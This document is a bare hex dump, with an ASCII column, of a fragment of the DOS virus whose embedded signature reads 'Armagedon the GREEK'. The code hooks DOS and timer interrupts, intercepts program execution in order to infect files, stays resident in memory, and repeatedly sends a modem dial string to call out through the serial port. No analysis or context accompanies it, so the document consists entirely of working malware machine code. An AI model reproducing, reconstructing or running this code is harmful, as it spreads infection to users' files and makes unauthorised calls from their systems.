02C0:   0157CD21 2E8B1E38  01B43ECD 210E1FBA   8000B41A CD212EA1  3E018EC0 B449CD21   ".W.!...8..>.!........!..>....I.!"
02E0:   2EA14401 8ED82E8B  164601B8 01432E8B   0E4801CD 21EB0690  1F5AEB01 905F075D   "..D......F...C...H..!....Z..._.]"
0300:   5A58595E 5B1FE913  FE551E06 50535152   56579C2E FF1E2601  E84A000E 1FB4058A   "ZXY^[....U..PSQRVW....&..J......"
0320:   2E2C013A E57734B4  063AE572 2E8A262A   0180FC01 7409B401  88262A01 EB1D90E8   ".,.:.w4..:.r..&*....t....&*....."
0340:   8900FF06 2F01A12F  013D1C02 750D33C0   88262A01 A32F0188  2633015F 5E5A595B   "..../../.=..u.3..&*../..&3._^ZY["
0360:   58071F5D CF0E1F32  C08A262B 0180FC11   75288A26 2E0180FC  3B75248A 262D0180   "X..]...2..&+....u(.&....;u$.&-.."
0380:   FC3B7521 8A262C01  80FC1775 1EA22C01   A22D01A2 2E01A22B  01C3FE06 2B01C3FE   ".;u!.&,....u..,..-.....+....+..."
03A0:   062E01EB F1FE062D  01EBE8FE 062C01EB   DF2B2B2B 61546830  6D307337 3D333564   ".......-.....,...+++aTh0m0s7=35d"
03C0:   70303831 2C2C2C2C  313431A0 33013C01   7463A034 013C0174  15B90300 8BD132E4   "p081,,,,141.3.<.tc.4.<.t......2."
03E0:   B083CD14 E2F6B001  A23401EB 48900E1F   BEB103A0 32013C1A  7503EB1E 9032E403   ".........4..H.......2.<.u....2.."
0400:   F08A04BA F803EEBA  F802EEBA E802EEBA   E803EEFE 063201EB  1C90B903 008BD1B0   ".....................2.........."
0420:   0DB401CD 14E2F6B8  0100A233 01882632   01882634 01C3B4E0  CD213DDA DA7503E9   "...........3..&2..&4.....!=..u.."
0440:   99000E1F B82135CD  21891E22 018C0624   01BA0301 B82125CD  21B80835 CD21891E   ".....!5.!.."...$.....!%.!..5.!.."
0460:   26018C06 2801BA09  03B80825 CD21B42C   CD21882E 2C01880E  2D018836 2E012EA1   "&...(......%.!.,.!..,...-..6...."
0480:   2C008ED8 33F68A04  3C017403 46EBF746   468BD68C C88EC0BB  5A00B44A CD212E8B   ",...3...<.t.F..FF.......Z..J.!.."
04A0:   1E81008C C88EC02E  A356012E A35A012E   A35201B8 004B2E8C  1640012E 89264201   ".........V...Z...R...K...@...&B."
04C0:   9C2EFF1E 22012EA1  40018ED0 2EA14201   8BE08CC8 8ED8BA37  05CD27B4 E1CD21BE   "...."...@.....B........7..'...!."
04E0:   F3042E89 4403B8F8  042E8944 012EA13A   018CCBEA 00000000  8BC88EDB BE0001BF   "....D......D...:................"
0500:   37058A05 88044647  E2F8BE1F 052E8C5C   03A00001 2C0BA200  018CD88E C08ED0EA   "7.....FG.......\....,..........."
0520:   00010713 41726D61  6765646F 6E207468   65204752 45454BD8  20                  "....Armagedon the GREEK. "

